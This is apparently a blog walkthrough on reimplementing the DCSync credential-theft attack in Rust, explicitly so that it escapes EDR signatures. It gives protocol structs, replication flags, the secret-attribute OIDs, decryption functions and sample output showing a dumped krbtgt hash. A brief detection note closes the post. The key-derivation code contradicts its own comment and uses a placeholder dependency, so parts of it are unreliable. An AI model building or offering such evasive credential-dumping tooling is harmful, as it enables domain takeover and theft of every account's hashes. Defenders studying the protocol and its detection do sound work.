---
title: "Implementing DCSync in Rust — MS-DRSR from Scratch"
description: "A walkthrough of implementing the MS-DRSR replication protocol in Rust to extract krbtgt and NTLM hashes directly from a Domain Controller — without Mimikatz or impacket."
pubDate: 2025-03-10
tags: [dcsync, ms-drsr, active-directory, credential-access, rust]
---

## Why Re-implement DCSync

Mimikatz's `lsadump::dcsync` and impacket's `secretsdump.py` are reliable — but they are among the most-signatured tools in any enterprise EDR catalogue. A from-scratch Rust implementation:

- Produces unique network traffic signatures
- Has no static binary similarity to known tools
- Can be stripped to only the protocol logic you need
- Compiles to a single static binary with no runtime dependencies

This walkthrough covers the protocol layer. Operational tradecraft (credential material for the DCSync account, traffic blending) is a separate concern.

## MS-DRSR Overview

The Directory Replication Service Remote Protocol (MS-DRSR) is an RPC-based protocol used by Domain Controllers to synchronise the AD database. Two RPCs matter:

| RPC | Purpose |
|-----|---------|
| `IDL_DRSBind` | Establish a replication session and exchange capabilities |
| `IDL_DRSGetNCChanges` | Pull object changes (including secret attributes) from a naming context |

The attack works because any account with the **Replicating Directory Changes** and **Replicating Directory Changes All** DACLs can call these RPCs. Domain Admins have these rights by default; they can also be delegated intentionally (for backup products) or by mistake.

## Protocol Implementation in Rust

### Dependencies

```toml
[dependencies]
# RPC/MSRPC transport
ms-dtyp   = "0.2"
impacket  = { git = "https://github.com/..." }  # placeholder — use your own bindings

# NTLM authentication
ntlm      = "0.4"

# Crypto (RC4, MD4, AES for hash derivation)
rc4       = "0.1"
md4       = "0.10"
aes       = "0.8"

# Serialisation
serde     = { version = "1", features = ["derive"] }
bytes     = "1"
```

> **Note:** There is no stable Rust crate for MS-DRSR as of early 2025. You will need to implement the NDR serialisation of the relevant structures from the spec (sections 5.200–5.210 in MS-DRSR).

### Binding

`IDL_DRSBind` establishes the session. You provide your client UUID and a `DRS_EXTENSIONS` structure advertising your replication capabilities:

```rust
pub struct DrsExtensionsInt {
    pub cb:              u32,
    pub dw_flags:        u32,    // DRSUAPI_SUPPORTED_EXTENSION_*
    pub site_objguid:    Guid,
    pub pid:             u32,
    pub dw_repl_epoch:   u32,
    pub dw_flags_ext:    u32,
    pub config_objguid:  Guid,
    pub dw_ext_caps:     u32,
}

// Minimum flags to advertise for DCSync to succeed
const EXT_BASE:     u32 = 0x00000001;  // DRSUAPI_SUPPORTED_EXTENSION_BASE
const EXT_ASYNCREP: u32 = 0x00000002;  // DRSUAPI_SUPPORTED_EXTENSION_ASYNCREPLICATION
```

The server responds with its own `DRS_EXTENSIONS` and a handle (`DRS_HANDLE`) you use in all subsequent calls.

### Requesting Changes

`IDL_DRSGetNCChanges` is the main extraction call. The key request fields:

```rust
pub struct DrsGetNcChangesRequest8 {
    pub h_drs:                 DrsHandle,
    pub dw_in_version:         u32,        // 8
    pub pmsg_in:               DrsGetNcChangesRequest,
}

pub struct DrsGetNcChangesRequest {
    pub uuid_invoc_id_src:    Guid,        // your client GUID
    pub p_nc:                 DsName,      // target naming context, e.g. DC=corp,DC=local
    pub replication_epoch:    u32,
    pub dw_flags:              u32,        // DRS_SYNC_EXTEVENT | DRS_WRIT_REP
    pub pa_partial_attr_set:  PartialAttrSet,  // which attributes to pull
    pub pa_partial_attr_set_ex: Option<PartialAttrSet>,
    pub pref_max_objects:     u32,         // batch size
    pub pref_max_bytes:       u32,
    pub ul_extended_op:       ExtendedOp,  // EXOP_REPL_OBJ to target a single object
    pub ll_large_sync:        u64,
}
```

To target a specific account (e.g., `krbtgt`), set `ul_extended_op = EXOP_REPL_OBJ` and populate `p_nc` with the object's distinguished name.

### Attribute Extraction

The attributes you care about are returned as `ATTR_VAL` blobs inside `ATTRBLOCK` structures. The secret attributes:

| Attribute OID | Content |
|--------------|---------|
| `1.2.840.113556.1.4.90`  | `unicodePwd` — RC4 NTLM hash, encrypted with session key |
| `1.2.840.113556.1.4.214` | `supplementalCredentials` — AES keys and historic hashes |

Both are protected with the session key negotiated during `IDL_DRSBind`. You must derive the session key from the user's credentials before you can decrypt the blobs.

### Session Key Derivation

```rust
// Simplified — actual derivation uses CryptDeriveKey with SHA1 of the NT hash
fn derive_session_key(nt_hash: &[u8; 16], session_nonce: &[u8]) -> [u8; 16] {
    let mut md5 = Md5::new();
    md5.update(nt_hash);
    md5.update(session_nonce);
    md5.finalize().into()
}

// Decrypt the unicodePwd blob
fn decrypt_nt_hash(encrypted: &[u8], session_key: &[u8; 16]) -> [u8; 16] {
    // First 16 bytes: RC4 key material derived from session_key
    // Remaining 16 bytes: the encrypted hash
    let rc4_key = &encrypted[..16];
    let ciphertext = &encrypted[16..32];
    rc4_decrypt(session_key, rc4_key, ciphertext)
}
```

## Output

A successful run against the `krbtgt` account produces:

```
[+] Binding to DC: 10.10.10.1
[+] IDL_DRSBind: handle obtained
[+] Requesting changes for CN=krbtgt,CN=Users,DC=corp,DC=local
[+] Received 1 object, 4 attributes

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7b3c8f9a2d1e4f6a8c0b2d4e6f8a0c2e:::
```

> **Detection:** Event `4662` is generated for each object accessed. The operation type will show `Replicating Directory Changes All` permission usage. Correlate with the source IP — if it's not a known DC, it's DCSync.
